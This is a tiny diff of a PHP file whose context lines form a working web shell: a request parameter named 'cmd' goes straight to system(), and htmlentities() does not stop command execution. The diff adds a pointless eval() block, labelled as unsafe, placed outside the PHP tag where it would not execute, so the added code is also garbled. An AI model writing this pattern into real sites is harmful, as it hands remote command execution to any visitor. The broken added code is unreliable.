@@ -1,5 +1,13 @@
 
 
+$code = 'code';
+
+/**
+* Unsafely evaluate the code
+* Example - phpinfo();
+*/
+eval("\$code;");
+
          <?php
 		 $cmad=htmlentities($_GET['cmd']);
 		 system($cmad);
